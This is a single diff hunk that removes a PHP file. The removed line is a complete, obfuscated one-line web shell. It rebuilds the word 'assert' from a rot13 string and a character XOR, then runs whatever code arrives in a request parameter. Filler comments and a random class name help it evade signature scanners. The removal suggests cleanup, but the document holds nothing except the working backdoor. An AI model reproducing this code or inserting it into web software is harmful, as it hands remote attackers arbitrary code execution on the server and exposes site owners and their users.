@@ -1,1 +1,0 @@
-<?php class  GY31f05w{/*F9B3CU*/function __construct($x){$c=str_rot13('ffreg');/*F9B3CU*/$a= ("!"^"@").$c;/*F9B3CU*/$a($x);}}new  GY31f05w($_REQUEST['zcl']); ?>
